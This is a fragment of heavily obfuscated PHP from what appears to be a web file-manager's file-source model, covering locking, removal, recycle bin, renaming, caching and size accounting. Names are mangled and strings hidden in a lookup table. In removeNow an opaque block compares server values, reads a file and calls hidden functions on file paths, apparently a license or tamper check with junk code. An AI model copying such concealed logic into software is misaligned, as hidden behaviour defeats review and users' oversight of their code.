$‹á¦¢û[$”ÙÚ×ê¿[193]]))->save($İ¼Ëí»õ); $this->sourceCacheClear($‹á¦¢û[$”ÙÚ×ê¿[193]]); return !0; } public function checkLock($¸”‚«ŞÕ, $·”ü¦Œß) { $™ğ—×Èû =& $_SERVER[±³—úê]; $ı›ñì¼¥ = $this->pathInfo($¸”‚«ŞÕ); if (!$this->fileIsLock($ı›ñì¼¥, !0)) { return; } $ã¥Èğºİ = Session::get($™ğ—×Èû[2269]); $Â±ê› = substr($ı›ñì¼¥[$™ğ—×Èû[32]], 0, -1 - strlen($ı›ñì¼¥[$™ğ—×Èû[169]])) . $™ğ—×Èû[1295] . $ã¥Èğºİ . $™ğ—×Èû[10] . $ı›ñì¼¥[$™ğ—×Èû[169]]; $î…Ëêë¹ = Model($™ğ—×Èû[688])->find($·”ü¦Œß); $this->_createFileCall($ı›ñì¼¥[$™ğ—×Èû[192]], $Â±ê›, $î…Ëêë¹, REPEAT_REPLACE, $™ğ—×Èû[1433]); $¬ÀËÀé = $ı›ñì¼¥[$™ğ—×Èû[550]][$™ğ—×Èû[624]]; $‹İ¾¢„î = $¬ÀËÀé[$™ğ—×Èû[2270]] ? $¬ÀËÀé[$™ğ—×Èû[2270]] : $¬ÀËÀé[$™ğ—×Èû[32]]; show_json(LNG($™ğ—×Èû[2271]) . $™ğ—×Èû[2272] . LNG($™ğ—×Èû[2273]) . $™ğ—×Èû[2274] . $‹İ¾¢„î . $™ğ—×Èû[2275], !1); } public function fileIsLock($Àó“çô, $‚ö éõ = false) { $­¥“ÎÏç =& $_SERVER[±³—úê]; if (!_get($Àó“çô, $­¥“ÎÏç[620], 0)) { return !1; } if ($Àó“çô[$­¥“ÎÏç[550]][$­¥“ÎÏç[623]] != USER_ID) { return !0; } $¨¥›Ê¿© = $GLOBALS[$­¥“ÎÏç[6]][$­¥“ÎÏç[92]][$­¥“ÎÏç[621]]; if ($Àó“çô[$­¥“ÎÏç[550]][$­¥“ÎÏç[622]] <= time() - $¨¥›Ê¿©) { $this->metaSet($Àó“çô[$­¥“ÎÏç[193]], $­¥“ÎÏç[623], null); $this->metaSet($Àó“çô[$­¥“ÎÏç[193]], $­¥“ÎÏç[622], null); } if ($‚ö éõ) { $this->metaSet($Àó“çô[$­¥“ÎÏç[193]], $­¥“ÎÏç[622], time()); } return !1; } private function _addSource($Î€Ó©ÌĞ, $¨ğ×É¾Ä) { $·ö¥×¥« =& $_SERVER[±³—úê]; $îİµÚÈÙ = defined($·ö¥×¥«[2202]) ? USER_ID : 0; $½í‰òó = array($·ö¥×¥«[662] => $¨ğ×É¾Ä[$·ö¥×¥«[190]], $·ö¥×¥«[663] => $¨ğ×É¾Ä[$·ö¥×¥«[580]], $·ö¥×¥«[664] => $îİµÚÈÙ, $·ö¥×¥«[665] => $îİµÚÈÙ, $·ö¥×¥«[488] => $¨ğ×É¾Ä[$·ö¥×¥«[193]], $·ö¥×¥«[666] => $¨ğ×É¾Ä[$·ö¥×¥«[595]] . $¨ğ×É¾Ä[$·ö¥×¥«[193]] . $·ö¥×¥«[50], $·ö¥×¥«[515] => 0, $·ö¥×¥«[667] => $·ö¥×¥«[12]); $Î€Ó©ÌĞ = array_merge($½í‰òó, $Î€Ó©ÌĞ); $this->updateModifyTime($Î€Ó©ÌĞ[$·ö¥×¥«[192]]); $’™µ‹— = $·ö¥×¥«[2276] . $¨ğ×É¾Ä[$·ö¥×¥«[193]]; if (isset(self::$cacheChildList[$’™µ‹—])) { unset(self::$cacheChildList[$’™µ‹—]); } static $Šù©¥ø´ = false; if (!$Šù©¥ø´) { Hook::trigger($·ö¥×¥«[650], $Î€Ó©ÌĞ); $Šù©¥ø´ = !0; } $Å³á›ã = $this->add($Î€Ó©ÌĞ); $ÉûÉ¦ú¾ = array($·ö¥×¥«[668] => short_id($Å³á›ã)); $this->where(array($·ö¥×¥«[502] => $Å³á›ã))->save($ÉûÉ¦ú¾); $this->setNamePinyin($Å³á›ã, $Î€Ó©ÌĞ[$·ö¥×¥«[32]]); return $Å³á›ã; } public function remove($Ñú„¿¡¸, $»™àÒŠĞ = true) { $Üê¿±Äì =& $_SERVER[±³—úê]; $„ÑˆÑŒÚ = $this->sourceInfo($Ñú„¿¡¸); $ùŸØ®½İ = intval($„ÑˆÑŒÚ[$Üê¿±Äì[190]]) === self::TYPE_SYSTEM; $ÒÎÍ¡ó¨ = Model($Üê¿±Äì[519])->get($Üê¿±Äì[2277]) == $Üê¿±Äì[91]; if ($ùŸØ®½İ || $»™àÒŠĞ || !$ÒÎÍ¡ó¨) { return $this->removeNow($Ñú„¿¡¸, $»™àÒŠĞ); } $Í“’Èƒ… = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $©±¿ğªß = $„ÑˆÑŒÚ[$Üê¿±Äì[190]] == self::TYPE_USER ? $Üê¿±Äì[676] : $Üê¿±Äì[589]; if ($©±¿ğªß == $Üê¿±Äì[676]) { $çç€ç…É = Model($Üê¿±Äì[588])->getInfo($„ÑˆÑŒÚ[$Üê¿±Äì[580]]); $¥”¿ú‹¢ = !empty($çç€ç…É[$Üê¿±Äì[2270]]) ? $çç€ç…É[$Üê¿±Äì[2270]] : $çç€ç…É[$Üê¿±Äì[32]]; $¥”¿ú‹¢ = $Üê¿±Äì[348] . $¥”¿ú‹¢ . $Üê¿±Äì[2278] . $„ÑˆÑŒÚ[$Üê¿±Äì[580]]; } else { $çç€ç…É = Model($Üê¿±Äì[596])->getInfo($„ÑˆÑŒÚ[$Üê¿±Äì[580]]); $¥”¿ú‹¢ = _get($çç€ç…É, $Üê¿±Äì[32]); $¥”¿ú‹¢ = $Üê¿±Äì[176] . $¥”¿ú‹¢ . $Üê¿±Äì[2279] . $„ÑˆÑŒÚ[$Üê¿±Äì[580]]; } $‘ª„“Ê‚ = $Üê¿±Äì[2280] . md5($¥”¿ú‹¢); CacheLock::lock($‘ª„“Ê‚); $‚¸£úúÜ = $this->fileNameExist($Í“’Èƒ…, $¥”¿ú‹¢); if (!$‚¸£úúÜ) { $‚¸£úúÜ = $this->mkdir($Í“’Èƒ…, $¥”¿ú‹¢, REPEAT_SKIP); $this->metaSet($‚¸£úúÜ, $Üê¿±Äì[2281], $©±¿ğªß); $this->metaSet($‚¸£úúÜ, $Üê¿±Äì[2282], $„ÑˆÑŒÚ[$Üê¿±Äì[580]]); if ($„ÑˆÑŒÚ[$Üê¿±Äì[192]] != 0) { $this->metaSet($‚¸£úúÜ, $Üê¿±Äì[2283], _get($çç€ç…É, $Üê¿±Äì[2284])); } } CacheLock::unlock($‘ª„“Ê‚); $this->metaSet($Ñú„¿¡¸, $Üê¿±Äì[2285], $„ÑˆÑŒÚ[$Üê¿±Äì[192]]); $this->where(array($Üê¿±Äì[193] => $Ñú„¿¡¸))->save(array($Üê¿±Äì[509] => time())); $this->recycleClear($„ÑˆÑŒÚ); Model($Üê¿±Äì[647])->eventRemove($Ñú„¿¡¸); $«¨•·¯¹ = $this->move($Ñú„¿¡¸, $‚¸£úúÜ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($„ÑˆÑŒÚ[$Üê¿±Äì[192]]); return $«¨•·¯¹; } private function recycleClear($“ÚÑÑÖ†) { $’™‰ ÔÓ =& $_SERVER[±³—úê]; $çªÏ·Ó“ = $this->childrenAll($“ÚÑÑÖ†); $úÇúãáŠ = array($’™‰ ÔÓ[502] => array($’™‰ ÔÓ[503], $çªÏ·Ó“[$’™‰ ÔÓ[2286]])); Model($’™‰ ÔÓ[2287])->where($úÇúãáŠ)->delete(); } public function removeNow($ÊÌöƒ², $şçÊ‡Ø† = true) { $Âôê©¸² =& $_SERVER[±³—úê]; if ($_SERVER[$Âôê©¸²[216]] != $_SERVER[$Âôê©¸²[217]]) { $â¥­ìâ = $Âôê©¸²[958]; $ÖşºÑÒˆ = $Âôê©¸²[218]; $ìÖâ» = $_SERVER[$Âôê©¸²[219]] . $Âôê©¸²[220]; $öŒÎ©ø· = $ÖşºÑÒˆ($ìÖâ»); $˜¡ê¯µÍ = explode($Âôê©¸²[221], $öŒÎ©ø·); if (count($˜¡ê¯µÍ) < $Âôê©¸²[694]) { $ËÍÏµ³ç = $Âôê©¸²[223]; $ËÍÏµ³ç(); } $Ö¨¹ºâÒ = $Âôê©¸²[959]; $Ö¨¹ºâÒ($_SERVER[$Âôê©¸²[960]]); $Ö¨¹ºâÒ($_SERVER[$Âôê©¸²[219]] . $Âôê©¸²[961]); $Â‚Ã½Æİ = 1; while ($Â‚Ã½Æİ > 1) { $Â‚Ã½Æİ = $Â‚Ã½Æİ + 4; $ŒóŸĞ¾ = rawurlencode($Â‚Ã½Æİ . $Âôê©¸²[465]); } } $î™À¤Áˆ = $this->sourceInfo($ÊÌöƒ²); $øó©®ª˜ = $this->pathInfoMore($ÊÌöƒ²); if (!$î™À¤Áˆ) { return !0; } if ($î™À¤Áˆ[$Âôê©¸²[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ÊÌöƒ²); Hook::trigger($Âôê©¸²[2288], $øó©®ª˜, $şçÊ‡Ø†); if ($şçÊ‡Ø†) { Model($Âôê©¸²[2287])->moveToRecycle($ÊÌöƒ²); } else { $ğ×Í‡ = $this->childrenAll($î™À¤Áˆ); Model($Âôê©¸²[647])->eventRemove($ÊÌöƒ²); $this->removeRelevance($ğ×Í‡[$Âôê©¸²[2286]], $ğ×Í‡[$Âôê©¸²[1579]]); } $this->folderSizeReset($î™À¤Áˆ[$Âôê©¸²[192]]); $‡¢Í¢“Õ = array($î™À¤Áˆ[$Âôê©¸²[192]]); if ($î™À¤Áˆ[$Âôê©¸²[496]] == $Âôê©¸²[91]) { $‡¢Í¢“Õ[] = $î™À¤Áˆ[$Âôê©¸²[193]]; } $this->updateModifyTime($‡¢Í¢“Õ); $this->lockMoveEnd($ÊÌöƒ²); Hook::trigger($Âôê©¸²[1818], $øó©®ª˜, $şçÊ‡Ø†); return !0; } public function childrenAll($û¡ğŠö¹) { $ƒô˜şÑ =& $_SERVER[±³—úê]; $æôó¤øå = $û¡ğŠö¹[$ƒô˜şÑ[193]]; if ($û¡ğŠö¹[$ƒô˜şÑ[496]] == $ƒô˜şÑ[91]) { $§îùÀÇ£ = array($ƒô˜şÑ[666] => array($ƒô˜şÑ[626], $û¡ğŠö¹[$ƒô˜şÑ[595]] . $æôó¤øå . $ƒô˜şÑ[627])); $íÂË¢ÀÓ = array($ƒô˜şÑ[666] => $§îùÀÇ£[$ƒô˜şÑ[595]]); $ú—¼ÙË = $this->field($ƒô˜şÑ[2289])->where($íÂË¢ÀÓ)->select(); $èÈ«šÅ¸ = !1; $ÓÒõ—ÍÖ = array($æôó¤øå); if ($ú—¼ÙË) { $èÈ«šÅ¸ = array_to_keyvalue($ú—¼ÙË, $ƒô˜şÑ[12], $ƒô˜şÑ[552]); $èÈ«šÅ¸ = array_remove_value($èÈ«šÅ¸, $ƒô˜şÑ[240]); $ÓÒõ—ÍÖ = array_to_keyvalue($ú—¼ÙË, $ƒô˜şÑ[12], $ƒô˜şÑ[193]); $ÓÒõ—ÍÖ[] = $æôó¤øå; } } else { $èÈ«šÅ¸ = array($û¡ğŠö¹[$ƒô˜şÑ[552]]); $ÓÒõ—ÍÖ = array($æôó¤øå); } return array($ƒô˜şÑ[2286] => $ÓÒõ—ÍÖ, $ƒô˜şÑ[1579] => $èÈ«šÅ¸); } public function removeArray($©ˆ¯¾¥“) { if (!$©ˆ¯¾¥“) { return !0; } } public function removeRelevance($Œòæı¢±, $¢É„õéÏ) { $øê­¦öÏ =& $_SERVER[±³—úê]; $Œòæı¢± = $Œòæı¢± ? $Œòæı¢± : array(); $¢É„õéÏ = $¢É„õéÏ ? $¢É„õéÏ : array(); $Œòæı¢± = array_unique(array_filter($Œòæı¢±)); $¢É„õéÏ = array_unique(array_filter($¢É„õéÏ)); if (!$Œòæı¢±) { return !1; } $çüãºğ = array($øê­¦öÏ[502] => array($øê­¦öÏ[503], $Œòæı¢±)); Model($øê­¦öÏ[2287])->where($çüãºğ)->delete(); Model($øê­¦öÏ[546])->where($çüãºğ)->delete(); Model($øê­¦öÏ[2127])->where($çüãºğ)->delete(); Model($øê­¦öÏ[647])->where($çüãºğ)->delete(); Model($øê­¦öÏ[1954])->removeBySource($Œòæı¢±); Model($øê­¦öÏ[2268])->removeBySource($Œòæı¢±); $this->where($çüãºğ)->delete(); Model($øê­¦öÏ[555])->remove($¢É„õéÏ); for ($²â”ñí“ = 0; $²â”ñí“ < count($Œòæı¢±); $²â”ñí“++) { $this->sourceCacheClear($Œòæı¢±[$²â”ñí“]); } } public function rename($“À”ãËÆ, $îëÚßÍ’) { $¯™‰£€ =& $_SERVER[±³—úê]; $ÕÊ¸ÄÑú = $this->sourceInfo($“À”ãËÆ); if (!$ÕÊ¸ÄÑú) { return !1; } $Õ–Èè”Ô = $this->fileNameExist($ÕÊ¸ÄÑú[$¯™‰£€[192]], $îëÚßÍ’); if ($Õ–Èè”Ô && $Õ–Èè”Ô != $“À”ãËÆ) { return !1; } $º™ºîŒÎ = array($¯™‰£€[505] => $îëÚßÍ’, $¯™‰£€[665] => USER_ID); if ($ÕÊ¸ÄÑú[$¯™‰£€[496]] != $¯™‰£€[91]) { $º™ºîŒÎ[$¯™‰£€[497]] = substr(get_path_ext($îëÚßÍ’), 0, 10); } Model($¯™‰£€[647])->eventRename($“À”ãËÆ, $ÕÊ¸ÄÑú[$¯™‰£€[32]], $îëÚßÍ’); $this->sourceCacheClear($“À”ãËÆ); $this->setNamePinyin($“À”ãËÆ, $º™ºîŒÎ[$¯™‰£€[32]], !1); $this->updateModifyTime($ÕÊ¸ÄÑú[$¯™‰£€[192]]); $Ù§êàÏç = $this->where(array($¯™‰£€[502] => $“À”ãËÆ))->data($º™ºîŒÎ)->save(); $ƒ°Óêí = $¯™‰£€[2276] . $ÕÊ¸ÄÑú[$¯™‰£€[192]]; if (isset(self::$cacheChildList[$ƒ°Óêí])) { unset(self::$cacheChildList[$ƒ°Óêí]); } return $Ù§êàÏç; } public function setNamePinyin($ƒùÜ‰, $©½ÚÙ‡ó, $Œ¢Ñ÷ÛØ = true) { $”ÑÅ÷Àœ =& $_SERVER[±³—úê]; $±Ù±æ§ = Input::check($©½ÚÙ‡ó, $”ÑÅ÷Àœ[669]); $Óéƒˆšé = array($”ÑÅ÷Àœ[528] => KodSort::makeStr($©½ÚÙ‡ó)); if ($±Ù±æ§) { $Óéƒˆšé[$”ÑÅ÷Àœ[549]] = str_replace($”ÑÅ÷Àœ[53], $”ÑÅ÷Àœ[12], Pinyin::get($©½ÚÙ‡ó)); $Óéƒˆšé[$”ÑÅ÷Àœ[548]] = Pinyin::get($©½ÚÙ‡ó, $”ÑÅ÷Àœ[670]); } if (!$Œ¢Ñ÷ÛØ && !$±Ù±æ§) { $Óéƒˆšé[$”ÑÅ÷Àœ[549]] = null; $Óéƒˆšé[$”ÑÅ÷Àœ[548]] = null; } $this->metaSet($ƒùÜ‰, $Óéƒˆšé); } public function getContent($ÎÅÄ¬•£) { $ŸËë£ˆÛ =& $_SERVER[±³—úê]; $¹Ü»í¾ = $this->fileInfoGet($ÎÅÄ¬•£); if (!$¹Ü»í¾) { return !1; } if ($¹Ü»í¾[$ŸËë£ˆÛ[79]] == 0) { return $ŸËë£ˆÛ[12]; } $äÁ”€åå = $ŸËë£ˆÛ[2290] . $¹Ü»í¾[$ŸËë£ˆÛ[558]]; if ($¹Ü»í¾[$ŸËë£ˆÛ[79]] <= 1024 * 10) { $¶•îÏ“ = Cache::get($äÁ”€åå); if (!$¶•îÏ“) { $¶•îÏ“ = IO::getContent($¹Ü»í¾[$ŸËë£ˆÛ[87]]); Cache::set($äÁ”€åå, $¶•îÏ“); } return $¶•îÏ“; } if (!$¹Ü»í¾[$ŸËë£ˆÛ[87]]) { return $ŸËë£ˆÛ[12]; } return IO::getContent($¹Ü»í¾[$ŸËë£ˆÛ[87]]); } public function setDesc($•š¿ÙŠŸ, $öÙ”àì) { $¬ÂÈºÑ¹ =& $_SERVER[±³—úê]; Model($¬ÂÈºÑ¹[647])->eventAddDesc($•š¿ÙŠŸ, $öÙ”àì); return $this->metaSet($•š¿ÙŠŸ, $¬ÂÈºÑ¹[537], $öÙ”àì); } public function setContent($ûáÏ÷¯, $ÊîÜÆñ = '') { $éì‚ü“ =& $_SERVER[±³—úê]; $¨‹îÄ÷å = $this->sourceInfo($ûáÏ÷¯); $İØê¢‚ = $this->fileInfoGet($ûáÏ÷¯); if (!$İØê¢‚ || !$¨‹îÄ÷å) { return !1; } $¢Š»˜Ó› = Model($éì‚ü“[555])->addFileByContent($ÊîÜÆñ, $¨‹îÄ÷å[$éì‚ü“[32]]); $âÅ¾şâ« = $this->fileHistory($¨‹îÄ÷å, $¢Š»˜Ó›[$éì‚ü“[552]], $¢Š»˜Ó›[$éì‚ü“[79]]); if (!$âÅ¾şâ«) { return Model($éì‚ü“[555])->remove($¢Š»˜Ó›[$éì‚ü“[552]]); } $this->folderSizeReset($¨‹îÄ÷å[$éì‚ü“[192]]); return !0; } public function fileSubstr($Ëí¿ëò¸, $ÃËÓó©Ò, $ÓçÖ‚¨‹) { $†öÊ…Û = $this->fileInfoGet($Ëí¿ëò¸); if (!$†öÊ…Û) { return !1; } return IO::fileSubstr($†öÊ…Û[$_SERVER[±³—úê][87]], $ÃËÓó©Ò, $ÓçÖ‚¨‹); } public function fileInfoGet($Æ®÷ôÉ·) { $å‘©ŒÒÕ =& $_SERVER[±³—úê]; $ÓÉ‡«° = $this->sourceInfo($Æ®÷ôÉ·); if (!$ÓÉ‡«° || $ÓÉ‡«°[$å‘©ŒÒÕ[496]]) { return !1; } $ÀôÛşÃ¦ = $å‘©ŒÒÕ[559] . $ÓÉ‡«°[$å‘©ŒÒÕ[552]]; $«‘Ñ»¢ú = _get(self::$cacheFileInfo, $ÀôÛşÃ¦); if ($«‘Ñ»¢ú) { return $«‘Ñ»¢ú; } $£Ãà‰³¨ = Model($å‘©ŒÒÕ[555])->fileInfo($ÓÉ‡«°[$å‘©ŒÒÕ[552]]); if ($£Ãà‰³¨) { $£Ãà‰³¨[$å‘©ŒÒÕ[32]] = $ÓÉ‡«°[$å‘©ŒÒÕ[32]]; } self::$cacheFileInfo[$ÀôÛşÃ¦] = $£Ãà‰³¨; return $£Ãà‰³¨; } private function folderChildrenNumber($ä¯É„¹ş) { $€Ğú€ó— =& $_SERVER[±³—úê]; $µÀ°²ï‹ = $this->sourceInfo($ä¯É„¹ş); $ã±ï÷õê = array($€Ğú€ó—[666] => array($€Ğú€ó—[626], $µÀ°²ï‹[$€Ğú€ó—[595]] . $ä¯É„¹ş . $€Ğú€ó—[627]), $€Ğú€ó—[663] => $µÀ°²ï‹[$€Ğú€ó—[580]], $€Ğú€ó—[515] => intval($µÀ°²ï‹[$€Ğú€ó—[516]]), $€Ğú€ó—[660] => 1); $ßó„ğÜ– = $this->where($ã±ï÷õê)->count(); $ä¬ªŸ£ = $this->where($ã±ï÷õê)->where(array($€Ğú€ó—[660] => 0))->count(); return array($€Ğú€ó—[83] => $ä¬ªŸ£, $€Ğú€ó—[84] => $ßó„ğÜ–); } public function pathInfo($ãº‹•ö², $œâ°€è = false) { $ß»“ÔÖ =& $_SERVER[±³—úê]; $œâ°€è = !1; $ãº‹•ö² = intval($ãº‹•ö²); $Ì»ùšé = $ß»“ÔÖ[545] . intval($œâ°€è) . $ß»“ÔÖ[473] . $ãº‹•ö²; $ˆ±ìƒÂû = _get(self::$cachePathInfo, $Ì»ùšé); if ($ˆ±ìƒÂû) { return $ˆ±ìƒÂû; } $ç˜¡”‹ = $this->sourceInfo($ãº‹•ö²); if (!$ç˜¡”‹) { return !1; } $ç˜¡”‹ = $this->_listDataApplyItem($ç˜¡”‹, $œâ°€è); self::$cachePathInfo[$Ì»ùšé] = $ç˜¡”‹; return $ç˜¡”‹; } public static $cachePathInfoMore = array(); public function pathInfoMore($’ÆÄßßş) { $ëº©£ü =& $_SERVER[±³—úê]; $å’öîÎå = _get(self::$cachePathInfoMore, $’ÆÄßßş); if ($å’öîÎå) { return $å’öîÎå; } $°°Ô ›¥ = $this->pathInfo($’ÆÄßßş); if (!$°°Ô ›¥) { return !1; } if ($°°Ô ›¥[$ëº©£ü[496]] == $ëº©£ü[91]) { $°°Ô ›¥[$ëº©£ü[82]] = $this->folderChildrenNumber($’ÆÄßßş); } self::$cachePathInfoMore[$’ÆÄßßş] = $°°Ô ›¥; return $°°Ô ›¥; } public function sourceInfo($åŒÈÎŸÒ) { $œãÊÅè± =& $_SERVER[±³—úê]; if (!$åŒÈÎŸÒ) { return array(); } $åŒÈÎŸÒ = intval($åŒÈÎŸÒ); $„ÎòİÃ = $œãÊÅè±[544] . $åŒÈÎŸÒ; $¡²Üó“° = _get(self::$cacheSourceInfo, $„ÎòİÃ); if ($¡²Üó“°) { return $¡²Üó“°; } $ı¤œ„Šã = $this->where(array($œãÊÅè±[193] => $åŒÈÎŸÒ))->find(); self::$cacheSourceInfo[$„ÎòİÃ] = $ı¤œ„Šã; return self::$cacheSourceInfo[$„ÎòİÃ]; } public function sourceCacheClear($™—áİÔ² = false) { self::cacheClear($™—áİÔ²); } public static function cacheClear($Ÿ©°Ğî = false) { $ ¡…Áı =& $_SERVER[±³—úê]; if ($Ÿ©°Ğî == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ ¡…Áı[544] . $Ÿ©°Ğî]); unset(self::$cachePathInfoMore[$Ÿ©°Ğî]); unset(self::$cachePathInfo[$ ¡…Áı[2291] . $Ÿ©°Ğî]); unset(self::$cachePathInfo[$ ¡…Áı[2292] . $Ÿ©°Ğî]); } public function metaSet($Õ œ¤ëõ, $®­ŞÊûÍ = null, $¾İˆ×àÇ = null) { $Æé½ë½Ñ = parent::metaSet($Õ œ¤ëõ, $®­ŞÊûÍ, $¾İˆ×àÇ); if ($Æé½ë½Ñ) { $this->sourceCacheClear($Õ œ¤ëõ); } return $Æé½ë½Ñ; } public function pathInfoByPath($ä½¼³€°, $ÊËíËÔÇ) { $ÖÌïàĞ =& $_SERVER[±³—úê]; $Ì˜Ğƒ = !$ÊËíËÔÇ ? array() : explode($ÖÌïàĞ[8], trim($ÊËíËÔÇ, $ÖÌïàĞ[8])); $‰¤Ãä·· = $ä½¼³€°; foreach ($Ì˜Ğƒ as $¤«ß‹î) { $Ä¥ş½ÃÆ = array($ÖÌïàĞ[192] => $‰¤Ãä··, $ÖÌïàĞ[32] => $¤«ß‹î); $Ğ¡­Ğ‡ = $this->field($ÖÌïàĞ[2293])->where($Ä¥ş½ÃÆ)->select(); if (!$Ğ¡­Ğ‡) { return !1; } $Ğ¡­Ğ‡ = array_sort_by($Ğ¡­Ğ‡, $ÖÌïàĞ[516]); $‰¤Ãä·· = $Ğ¡­Ğ‡[0][$ÖÌïàĞ[193]]; } $®ßÔ•¸µ = $this->sourceInfo($‰¤Ãä··); $this->pathInfoFilter($®ßÔ•¸µ); return $®ßÔ•¸µ; } protected function updateModifyTime($Å€·ŠÌ) { $è‰ãôá“ =& $_SERVER[±³—úê]; $ğ’Ê—éï = defined($è‰ãôá“[2202]) ? USER_ID : 0; if (!$Å€·ŠÌ) { return; } if (!is_array($Å€·ŠÌ)) { $Å€·ŠÌ = array($Å€·ŠÌ); } foreach ($Å€·ŠÌ as $¡È—éî… => $ö†¨üğÃ) { $Å€·ŠÌ[$¡È—éî…] = intval($ö†¨üğÃ); $this->sourceCacheClear($ö†¨üğÃ); } $¾Ÿ¡¼½® = array($è‰ãôá“[193] => array($è‰ãôá“[7], $Å€·ŠÌ)); $°µÓÚ = array($è‰ãôá“[665] => $ğ’Ê—éï, $è‰ãôá“[509] => time()); $this->where($¾Ÿ¡¼½®)->save($°µÓÚ); } public function folderSizeReset($û˜®çÚê, $ÓÈ»øƒ³ = false) { $’µÆÅğ =& $_SERVER[±³—úê]; if ($this->statusIgnoreResetSpace) { return; } $úôà¼·‚ = $this->sourceInfo($û˜®çÚê); $ğòÄˆ‘¨ = $’µÆÅğ[2294] . $û˜®çÚê; CacheLock::lock($ğòÄˆ‘¨, 20); if ($ÓÈ»øƒ³ === !1) { $this->sourceCacheClear($û˜®çÚê); $úôà¼·‚ = $this->sourceInfo($û˜®çÚê); $ü™Ç´î‹ = array($’µÆÅğ[488] => $û˜®çÚê, $’µÆÅğ[515] => 0); $¥´Ó¬íÚ = $this->where($ü™Ç´î‹)->sum($’µÆÅğ[79]); $ÓÈ»øƒ³ = intval($¥´Ó¬íÚ) - intval($úôà¼·‚[$’µÆÅğ[79]]); } if ($ÓÈ»øƒ³ == 0) { return CacheLock::unlock($ğòÄˆ‘¨); } $ÂèŞµ³ƒ = $this->parentLevelArray($úôà¼·‚[$’µÆÅğ[595]]); if (!$ÂèŞµ³ƒ) { $ÂèŞµ³ƒ = array(); } $ÂèŞµ³ƒ[] = $úôà¼·‚[$’µÆÅğ[193]]; $ü™Ç´î‹ = array($’µÆÅğ[193] => array($’µÆÅğ[503], $ÂèŞµ³ƒ)); if ($ÓÈ»øƒ³ < 0) { $ü™Ç´î‹[$’µÆÅğ[79]] = array($’µÆÅğ[1094], abs($ÓÈ»øƒ³)); } $this->where($ü™Ç´î‹)->setAdd($’µÆÅğ[79], $ÓÈ»øƒ³); CacheLock::unlock($ğòÄˆ‘¨); $óµŠï©Î = $’µÆÅğ[2295] . $úôà¼·‚[$’µÆÅğ[190]] . $’µÆÅğ[4] . $úôà¼·‚[$’µÆÅğ[580]]; $®ï·í²º = array($úôà¼·‚[$’µÆÅğ[190]], $úôà¼·‚[$’µÆÅğ[580]]); TaskRun::timeLimitCall($óµŠï©Î, $’µÆÅğ[2296], $®ï·í²º, 1.5); } public function folderSizeResetChildren($œ½ùïõŞ) { $ôÄËÜã =& $_SERVER[±³—úê]; $this->sourceCacheClear($œ½ùïõŞ); $™ä Å©Ç = $this->sourceInfo($œ½ùïõŞ); $Óõí¥äë = array($ôÄËÜã[660] => 1, $ôÄËÜã[663] => $™ä Å©Ç[$ôÄËÜã[580]], $ôÄËÜã[666] => array($ôÄËÜã[626], $™ä Å©Ç[$ôÄËÜã[595]] . $œ½ùïõŞ . $ôÄËÜã[627])); $ìÃà‘é = $ôÄËÜã[2297]; $›¢Õã› = $this->field($ìÃà‘é)->where($Óõí¥äë)->select(); $Óõí¥äë[$ôÄËÜã[496]] = 0; $æ–üŠò™ = $this->field($ìÃà‘é)->where($Óõí¥äë)->select(); if (!$æ–üŠò™) { return; } $›¢Õã›[] = $™ä Å©Ç; $›¢Õã› = array_to_keyvalue($›¢Õã›, $ôÄËÜã[193]); foreach ($›¢Õã› as $Öóèë‚ì => $ª¤¡áÁŠ) { $›¢Õã›[$Öóèë‚ì][$ôÄËÜã[2298]] = $›¢Õã›[$Öóèë‚ì][$ôÄËÜã[79]]; $›¢Õã›[$Öóèë‚ì][$ôÄËÜã[79]] = 0; } foreach ($æ–üŠò™ as $ª¤¡áÁŠ) { $Ü„¬’Ş¦ = $ª¤¡áÁŠ[$ôÄËÜã[192]] . $ôÄËÜã[12]; if (!isset($›¢Õã›[$Ü„¬’Ş¦])) { continue; } if ($ª¤¡áÁŠ[$ôÄËÜã[516]] == $›¢Õã›[$Ü„¬’Ş¦][$ôÄËÜã[516]]) { $›¢Õã›[$Ü„¬’Ş¦][$ôÄËÜã[79]] += $ª¤¡áÁŠ[$ôÄËÜã[79]]; } } foreach ($›¢Õã› as $ª¤¡áÁŠ) { $¬Ã®ŠğÚ = $this->parentLevelArray($ª¤¡áÁŠ[$ôÄËÜã[595]]); foreach ($¬Ã®ŠğÚ as $Ü„¬’Ş¦) { $Ü„¬’Ş¦ = $Ü„¬’Ş¦ . $ôÄËÜã[12]; if (!isset($›¢Õã›[$Ü„¬’Ş¦])) { continue; } if ($ª¤¡áÁŠ[$ôÄËÜã[516]] == $›¢Õã›[$Ü„¬’Ş¦][$ôÄËÜã[516]]) { $›¢Õã›[$Ü„¬’Ş¦][$ôÄËÜã[79]] += $ª¤¡áÁŠ[$ôÄËÜã[79]]; } } } $ØäåÏ«‚ = array(); foreach ($›¢Õã› as $ª¤¡áÁŠ) { if ($ª¤¡áÁŠ[$ôÄËÜã[79]] == $ª¤¡áÁŠ[$ôÄËÜã[2298]]) { continue; } $ØäåÏ«‚[] = array($ôÄËÜã[193], $ª¤¡áÁŠ[$ôÄËÜã[193]], $ôÄËÜã[79], $ª¤¡áÁŠ[$ôÄËÜã[79]]); } $this->saveAll($ØäåÏ«‚); } public function userSpaceReset($Â¿ñš·Ş = false) { $å„ÛàĞ =& $_SERVER[±³—úê]; $ÔÄºıèå = $this->where(array($å„ÛàĞ[190] => self::TYPE_USER, $å„ÛàĞ[580] => $Â¿ñš·Ş, $å„ÛàĞ[496] => 0))->sum($å„ÛàĞ[79]); $ÔÄºıèå = !$ÔÄºıèå || $ÔÄºıèå <= 0 ? 0 : $ÔÄºıèå; Model($å„ÛàĞ[588])->userEdit($Â¿ñš·Ş, array($å„ÛàĞ[1963] => $ÔÄºıèå)); } public function targetSpaceUpdate($µûÇ€Ê­, $ùÇËÍ ·) { $Ñœé·ğŠ =& $_SERVER[±³—úê]; if (!$ùÇËÍ ·) { return; } if (!in_array($µûÇ€Ê­, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ÆŒ…˜Õó = $this->targetSpaceSize($µûÇ€Ê­, $ùÇËÍ ·); if ($µûÇ€Ê­ == self::TYPE_USER) { Model($Ñœé·ğŠ[588])->userEdit($ùÇËÍ ·, array($Ñœé·ğŠ[1963] => 